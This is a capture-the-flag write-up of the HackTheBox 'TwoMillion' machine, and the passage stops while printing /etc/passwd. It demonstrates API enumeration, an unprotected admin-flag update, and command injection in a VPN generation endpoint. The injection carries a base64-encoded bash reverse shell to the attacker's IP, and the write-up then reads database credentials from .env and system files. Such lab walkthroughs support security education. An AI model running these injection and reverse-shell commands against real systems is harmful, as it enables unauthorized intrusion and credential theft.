---
title: HackTheBox - TwoMillion
description: TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox.
author: ha3ks
date: 2026-08-24
categories: [WriteUp]
tags: [HackTheBox]
pin: true
math: true
mermaid: true
image:
  path: /imgs/posts/TwoMillion/logo.png
  alt: 
---

## TwoMillion
The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.

#### Enumeration

```
└─$ sudo nmap -Pn -sV -T4 10.129.71.55                                       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 13:57 +0100
Nmap scan report for 10.129.71.55
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.95 seconds
``` 

##### > Port 22 - ssh
This we will come back to when we have some kind of password to work with.

##### > Port 80 - http

![1](/imgs/posts/TwoMillion/1.png){: .align-center }

Per the box description this is a commerative machine celebrating the old HackTheBox Website.

As you had to 'hack' your way in origionally it stands to reason that the same vuln exists for this version of the site also.

#### Initial Access

![2](/imgs/posts/TwoMillion/2.png){: .align-center }

It would appear that the site uses the same invite method to gain access, to exploit this we need to repeat 'how we used to get in', let's open dev tools and look at how the system generates login codes.

![3](/imgs/posts/TwoMillion/3.png){: .align-center }

The site uses the JavaScript function called 'inviteapi.min.js' and contained within the code for this js file is the command to 'makeInviteCode', because of this we can generate codes on demand and thus gain a valid code.

To execute this call to the API we can use CURL:

```
└─$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

response:

```
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "MzA3SU8tTUEySDMtOEkzMlEtTERLSEk=",
    "format": "encoded"
  }
}
```

We now have an encoded string. I can extrapolate from the string that it is Base64 encoded due to the '=" however it is always best to check and confirm.

We can use a terminal command or an online decoder to discover this and get our working invite code:

```
└─$ echo MzA3SU8tTUEySDMtOEkzMlEtTERLSEk= | base64 -d  
307IO-MA2H3-8I32Q-LDKHI 
```

Upon entering the code we can now proceed in making an account and getting inital access to the site:

![4](/imgs/posts/TwoMillion/4.png){: .align-center }

Once we have access we see the former site:

![5](/imgs/posts/TwoMillion/5.png){: .align-center }

Quite a lot of the site is in a non functional state, through a process of 'click around and find out' we discover that you can still download your VPN Connection pack:

![6](/imgs/posts/TwoMillion/6.png){: .align-center }

Opening the file gives us a general config file and key, nothing major however as this function is working I wonder what kind of calls it is making, to check this we can run Burpsuite, or simply hover over the button:

![7](/imgs/posts/TwoMillion/7.png){: .align-center }

So it is making a call to ```/api/v1/user/vpn/generate``` handily we can use CURL again to query that API:

```
└─$ curl -v 2million.htb/api
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.71.55
*   Trying 10.129.71.55:80...
* Established connection to 2million.htb (10.129.71.55 port 80) from 10.10.15.63 port 60812 
* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.21.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Mon, 24 Aug 2026 14:07:06 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=tp3medaq1uvud5bj1bt1fvmfad; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb:80 left intact
```

We arnt authenticated, but this proves we can poke it with a stick... let's test with our logged in session cookie from Firefox:

![8](/imgs/posts/TwoMillion/8.png){: .align-center }

```
└─$ curl -sv 2million.htb/api --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.71.55
*   Trying 10.129.71.55:80...
* Established connection to 2million.htb (10.129.71.55 port 80) from 10.10.15.63 port 37886 
* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.21.0
> Accept: */*
> Cookie: PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Mon, 24 Aug 2026 14:12:03 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [47 bytes data]
* Connection #0 to host 2million.htb:80 left intact
{
  "/api/v1": "Version 1 of the API"
}
```

We have a response and a v1 directory, so let us enumerate that:

```
└─$ curl -sv 2million.htb/api/v1 --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.71.55
*   Trying 10.129.71.55:80...
* Established connection to 2million.htb (10.129.71.55 port 80) from 10.10.15.63 port 39832 
* using HTTP/1.x
> GET /api/v1 HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.21.0
> Accept: */*
> Cookie: PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Mon, 24 Aug 2026 14:13:18 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [812 bytes data]
* Connection #0 to host 2million.htb:80 left intact
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

As you can see we have a handful of endpoints available now and more importantly, the admin ones...

It is highly unlikely we are an admin account at present, hence the 401 unauthorized from earlier, so we need to become an admin user.

Looking under the admin functions there is a PUT command which allows the admin to update an users settings.

As we are getting text in the JSON format from our API requests, lets feed it some JSON and see what happens:

```
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" --header "Content-Type: application/json" | jq                 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     56   0     56   0      0    299      0                              0
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Missing parameter, ok then let us add that into our PUT request:

```
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" --header "Content-Type: application/json" --data '{"email":"ha3ks@email.com"}' | jq  
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     86   0     59 100     27    318    145                              0
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Another missing parameter, add that:

```
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" --header "Content-Type: application/json" --data '{"email":"ha3ks@email.com", "is_admin": true}' | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    121   0     76 100     45    326    193                              0
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Computers man...

```
└─$ curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" --header "Content-Type: application/json" --data '{"email":"ha3ks@email.com", "is_admin": 1}' | jq   
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     83   0     41 100     42    210    215                              0
{
  "id": 13,
  "username": "ha3ks",
  "is_admin": 1
}
```

Ok so we now are an admin flagged account, what can we do now?

Well as we can generate a VPN connection pack as an user, lets see if we can use our admin cookie/permissions to generate a new one:

```
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" --header "Content-Type: application/json" | jq
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     59   0     59   0      0    157      0                              0
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

... for a random username:

```
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" --header "Content-Type: application/json" --data '{"username":"test"}'                                              
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Aug 24 14:31:15 2026 GMT
            Not After : Aug 24 14:31:15 2027 GMT
        Subject: C=GB, ST=London, L=London, O=test, CN=test
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:c3:0e:0a:43:88:06:bd:5e:ff:53:69:5e:b7:ba:
                    f4:ae:99:97:0f:7b:0b:63:6c:b3:5e:57:22:dd:f0:
                    c7:5a:d2:48:c5:e4:6e:be:bf:66:64:d4:e0:dd:8a:
                    9d:6a:8b:ec:3c:42:22:86:d4:da:f7:f1:0b:38:37:
                    f0:42:bf:23:8f:97:c8:41:85:42:d4:73:0c:96:6b:
                    2b:f6:29:4e:cc:0f:c7:63:39:5f:36:cf:c2:64:86:
                    9a:27:f5:da:b4:4b:e4:84:e9:43:d3:25:da:ca:25:
                    2b:3c:b2:b4:c5:ed:25:ee:8a:03:ec:70:1f:cb:dd:
                    71:6b:ff:8e:8f:a5:34:06:5f:22:04:93:cc:c3:29:
                    1b:05:13:43:70:e9:29:94:6d:71:3d:d4:51:57:fa:
                    eb:6b:72:ac:e8:0e:9f:37:93:05:57:07:0f:8f:c1:
                    55:2f:ef:3a:97:31:47:39:b9:90:29:31:c1:08:fb:
                    ed:e0:19:c1:f6:4c:54:91:1a:4a:fd:ec:50:a4:b1:
                    3b:9c:17:ec:f0:18:7a:0e:9c:f5:07:15:0d:df:c5:
                    98:0b:31:c5:7e:77:7c:f1:6d:07:9e:93:ae:e7:28:
                    51:1c:38:bc:38:2f:a4:cb:b0:59:73:8f:5d:71:78:
                    8a:73:41:47:86:6a:11:fc:c3:c1:21:21:4a:c8:eb:
                    a9:15
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                BB:0A:98:B7:D3:83:59:A7:E3:08:06:7C:D8:51:CD:46:31:63:42:36
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        37:a7:6f:8d:2f:47:f3:01:79:5f:ec:2a:eb:58:c4:51:b0:e3:
        de:df:3a:bd:56:36:42:bc:89:fc:d8:32:0e:7e:24:56:de:69:
        37:fa:81:4e:00:7b:61:50:a7:17:04:3a:ac:02:0c:27:5e:bc:
        44:a0:a6:f8:3b:7e:53:d8:fb:91:c4:58:72:5b:de:7f:39:40:
        2e:be:b2:e3:d6:75:4a:3f:77:99:22:d8:f6:9c:cb:94:31:31:
        43:b5:c5:fd:3e:0b:40:2d:3a:6a:85:f6:35:a0:81:14:8c:29:
        36:ce:8a:a2:b3:0d:a7:9a:32:06:92:8d:e0:e3:da:c8:19:16:
        88:7d:9d:10:43:84:1d:6b:36:c8:ae:9a:15:c3:52:33:bc:ab:
        03:37:15:e1:14:68:d6:5c:95:f2:ee:c9:a7:d4:ea:bd:99:2d:
        80:51:46:e8:3a:62:cb:f9:77:a7:4e:70:c5:c2:36:36:c5:9c:
        9b:6d:63:80:04:ad:bb:dc:06:52:b3:94:40:80:f7:f7:e6:0f:
        53:ec:13:99:30:93:b7:ff:5d:c1:52:56:c5:61:e2:60:30:69:
        82:87:13:5d:a7:34:4b:75:cf:1c:25:09:d7:79:c1:06:2e:36:
        6c:86:65:f4:e3:6a:9d:a4:98:8a:22:f3:db:c4:29:8e:a2:d3:
        22:ec:37:dd:ce:d4:18:38:e1:4a:82:00:c0:ed:30:b8:59:2f:
        11:76:df:4c:98:67:f4:9c:b9:ce:75:86:75:92:7c:86:bd:ec:
        aa:76:4b:9f:af:20:a2:96:b2:36:d7:d8:ab:9b:20:04:39:a7:
        1a:01:3c:14:48:9e:b2:34:8b:4a:d0:ad:46:bb:7d:43:9a:54:
        09:fa:06:61:8f:8e:36:91:2e:fb:b4:9a:84:ad:94:30:11:99:
        d8:b6:fb:68:04:f8:7c:d9:59:da:46:60:d7:b3:1e:df:40:50:
        43:2f:47:52:0f:77:7b:18:da:d1:5e:b0:36:57:9e:03:70:00:
        07:5b:ce:2e:cb:d7:0f:41:a1:1c:4d:db:85:66:c6:16:e6:2f:
        78:f9:ca:2a:fe:5e:ee:a5:69:8c:80:26:21:f8:26:c8:ee:3f:
        99:b5:ad:53:3f:47:b8:fa:76:ff:2d:94:c0:0c:8d:71:f5:8f:
        22:b2:b8:ad:5c:f7:01:22:5e:d8:76:c0:5a:1c:02:cd:21:df:
        10:29:a1:70:be:82:05:e8:fe:ab:9a:e6:a7:1e:ef:cc:26:06:
        9a:a5:d4:4c:e4:ff:db:8b:f8:51:b5:c9:d5:e7:9e:4f:1f:b6:
        af:e5:3a:07:a9:71:41:7c:8d:a3:94:c3:10:6d:be:1a:ac:98:
        cd:f6:d0:4f:0a:bb:5b:d0
-----BEGIN CERTIFICATE-----
MIIE2zCCAsOgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjYwODI0MTQzMTE1WhcNMjcw
ODI0MTQzMTE1WjBNMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xDTALBgNVBAoMBHRlc3QxDTALBgNVBAMMBHRlc3QwggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDDDgpDiAa9Xv9TaV63uvSumZcPewtj
bLNeVyLd8Mda0kjF5G6+v2Zk1ODdip1qi+w8QiKG1Nr38Qs4N/BCvyOPl8hBhULU
cwyWayv2KU7MD8djOV82z8Jkhpon9dq0S+SE6UPTJdrKJSs8srTF7SXuigPscB/L
3XFr/46PpTQGXyIEk8zDKRsFE0Nw6SmUbXE91FFX+utrcqzoDp83kwVXBw+PwVUv
7zqXMUc5uZApMcEI++3gGcH2TFSRGkr97FCksTucF+zwGHoOnPUHFQ3fxZgLMcV+
d3zxbQeek67nKFEcOLw4L6TLsFlzj11xeIpzQUeGahH8w8EhIUrI66kVAgMBAAGj
gYkwgYYwHQYDVR0OBBYEFLsKmLfTg1mn4wgGfNhRzUYxY0I2MB8GA1UdIwQYMBaA
FHpi3R22/krI4/if+qz0FQyWui6RMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgH+MCwG
CWCGSAGG+EIBDQQfFh1PcGVuU1NMIEdlbmVyYXRlZCBDZXJ0aWZpY2F0ZTANBgkq
hkiG9w0BAQsFAAOCAgEAN6dvjS9H8wF5X+wq61jEUbDj3t86vVY2QryJ/NgyDn4k
Vt5pN/qBTgB7YVCnFwQ6rAIMJ168RKCm+Dt+U9j7kcRYclvefzlALr6y49Z1Sj93
mSLY9pzLlDExQ7XF/T4LQC06aoX2NaCBFIwpNs6KorMNp5oyBpKN4OPayBkWiH2d
EEOEHWs2yK6aFcNSM7yrAzcV4RRo1lyV8u7Jp9TqvZktgFFG6Dpiy/l3p05wxcI2
NsWcm21jgAStu9wGUrOUQID39+YPU+wTmTCTt/9dwVJWxWHiYDBpgocTXac0S3XP
HCUJ13nBBi42bIZl9ONqnaSYiiLz28QpjqLTIuw33c7UGDjhSoIAwO0wuFkvEXbf
TJhn9Jy5znWGdZJ8hr3sqnZLn68gopayNtfYq5sgBDmnGgE8FEiesjSLStCtRrt9
Q5pUCfoGYY+ONpEu+7SahK2UMBGZ2Lb7aAT4fNlZ2kZg17Me30BQQy9HUg93exja
0V6wNleeA3AAB1vOLsvXD0GhHE3bhWbGFuYvePnKKv5e7qVpjIAmIfgmyO4/mbWt
Uz9HuPp2/y2UwAyNcfWPIrK4rVz3ASJe2HbAWhwCzSHfECmhcL6CBej+q5rmpx7v
zCYGmqXUTOT/24v4UbXJ1eeeTx+2r+U6B6lxQXyNo5TDEG2+GqyYzfbQTwq7W9A=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDDDgpDiAa9Xv9T
aV63uvSumZcPewtjbLNeVyLd8Mda0kjF5G6+v2Zk1ODdip1qi+w8QiKG1Nr38Qs4
N/BCvyOPl8hBhULUcwyWayv2KU7MD8djOV82z8Jkhpon9dq0S+SE6UPTJdrKJSs8
srTF7SXuigPscB/L3XFr/46PpTQGXyIEk8zDKRsFE0Nw6SmUbXE91FFX+utrcqzo
Dp83kwVXBw+PwVUv7zqXMUc5uZApMcEI++3gGcH2TFSRGkr97FCksTucF+zwGHoO
nPUHFQ3fxZgLMcV+d3zxbQeek67nKFEcOLw4L6TLsFlzj11xeIpzQUeGahH8w8Eh
IUrI66kVAgMBAAECggEACGPbNyprt8uVSf43T8nf6n66y7SsObucP4uZ+Vf5C0QO
U0zPIq9S9TVe8siamtGn+LOTjp8rSAz7QZDOaeCU5AFQYNkdlcvZF8NGYdFHDWoE
VpVKLi5jmzVa/isKHEVDcCAkhbmUHqvYn0TEl9rqjccsAgiUpY1B6rZUaINfqIJt
yXGWZqb08VYb2nux+/hTJPmmklKXUL63EjjV7PQkb7wuFgvje2VmbRAdhtkkkZQZ
1R1EgqJ/E1r59fi2bOBBgbemK5PWPXmdULQ6yjnfvs3mdM05+TGWpxz6qpFWFUrU
wPMoUYFA3mcjNp397tqZMhZN0rqLecrpjlXCu/x1gQKBgQDPBCopazqI8yWbJFci
tRAMageywWlNqRbqpWl80+faqqjWx8govAVvwrsmv4U94aynLKcMTzc2UioUiN9z
0jHfFViLvN64JzJxHLytZGSKLXJXOGwnWsHdYoGXCn02lPumlD08x6d3FgADpHbp
1ixQIHzHTSuq/0pRH7V/+FhO9QKBgQDxNVJ+uW6P3SllC1E8NbME/jouKjcEtbuV
Id7JaZC0cl+w58KMJKUQQmLSM09YetvhWxi05Sh/Tdt6hSBgyfPNX6fitNA+Ye46
It2CtoRh2lCYkztr+RFEUaefepG760q4iUMImMz6+hHnCklZd3gtLx+vQu1hDoMI
L0CmbAddoQKBgQCZlr5tMmggWT1qaEDZuDoq67PAdOzauHwPJSApg9J+EqXnjBu9
1Rm3fGN78RY6/icpdOCPKmqNO9KKn64hcS6dE2o5aqxXNoWfFDIL9vL87ZDqkyry
28v/o2kAFcEmcMxwH4V7hamCmejyyt+Kx+Lio+fPujqOyI9rtrnjMu7ZzQKBgCgz
tfMvHtFVkC+qKjj5zkOXx8Sn/pGHZKNfiM1TDe41XeOTTSakeOpz1hqouKHLoFg4
Ia8MvqoxJNKP26ymHD9voQC1GDw9gEIqS3ccyoWwqFw1teKyGYGkhmabPCzw83w8
THLjXM673T3/xefmdJ47S3GfmwbhL0+u6HyUZsnhAoGBAILw4/udP010G0v75Itu
9JRrdBZ+0/KwmUyre+aPCZGVF/eeYwuQWI8KiQTAazVCTA7EHVfLpXd/oVodDDVI
set7wqEQHclqIqov4GM4JDqx84SaArybd5NkEOefZK69U75xaxWnNk6DeUf7PQBe
qgOVR5SryVZw638MBAJY6nK0
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>
```

Ok that worked, and because this is an admin function it is likely that we can inject malicious code into the username request and try getting things out now.

First lets test an injection method, I want to see if we can get the ID from the logged in user, so to do this we change the username from 'test' to 'test;id;' notice the additional command and break out:

```
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" --header "Content-Type: application/json" --data '{"username":"test;id;"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ok we are the user www and better still we have a way in, first we need a listner on our machine running so we can catch a reverse shell coming in:

```
nc -nvlp 1222
```

And our command to run will be: 

```
bash -i >& /dev/tcp/10.10.15.63/1222 0>&1
```

However it will need to be encoded to actually shift over to the box, so we can base64 encode it:

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42My8xMjIyIDA+JjE=
```

So the command to run will be:

```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=0t4n0lpmk76qanpd1cuubr1ng1" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42My8xMjIyIDA+JjE= | base64 -d | bash;"}'
```

And what do we get?

```
└─$ nc -nvlp 1222
listening on [any] 1222 ...
connect to [10.10.15.63] from (UNKNOWN) [10.129.71.55] 38734
bash: cannot set terminal process group (1095): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ 
```

Access.

#### User Flag

To gain the user flag and eventual root flag we need to examine where we are presently, obviously as loudly as possible as this is not a red team engagement.

```
www-data@2million:~/html$ ls -alt
ls -alt
total 56
drwxr-xr-x 10 root root 4096 Aug 24 14:40 .
drwxr-xr-x  5 root root 4096 Aug 24 14:40 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
www-data@2million:~/html$ pwd
pwd
/var/www/html
```

We are in html, under www, and have an assortment of files available... I can see there is one file unlike the others .env, let us enumerate further

#### Enumeration

```
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Oh...

And again as stealth is optional:

```
www-data@2million:~/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
